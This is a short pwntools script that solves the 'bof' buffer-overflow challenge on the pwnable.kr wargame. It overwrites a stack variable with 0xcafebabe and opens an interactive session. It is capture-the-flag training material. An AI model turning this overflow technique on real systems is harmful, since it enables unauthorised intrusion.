#!/usr/bin/env python2

from pwn import *
import sys

# r = process('./bof')
r = remote('pwnable.kr', 9000)
r.send('a'*52 + p32(0xcafebabe) + '\n')
r.interactive()
